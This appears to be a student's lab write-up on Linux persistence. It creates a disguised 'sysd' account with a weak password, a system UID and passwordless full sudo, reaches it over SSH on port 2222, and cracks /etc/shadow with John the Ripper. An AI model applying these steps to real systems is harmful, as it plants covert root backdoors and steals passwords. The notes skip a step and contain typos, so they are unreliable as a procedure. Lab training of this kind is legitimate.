**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `sudo adduser sysd`

2. Give your secret user a password: 
    - `1234`
    

3. Give your secret user a system UID < 1000:
    - `sudo usermod -u 888 sysd`
    

4. Give your secret user the same GID:
   - `sudo groupmod -g 888 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `sudo visudo then in visudo I typed sysd ALL=(ALL:ALL) NOPASSWD:ALL`

    verify no home dir:

6. Test that `sudo` access works without your password:

    ```bash
    (ALL : ALL) NOPASSWD: ALL
    ```

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `sudo systemcrl restart ssh`

![descprition](IMAGE/listening.png)

2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `john /etc/shadow`

    This was sooooo coooool!
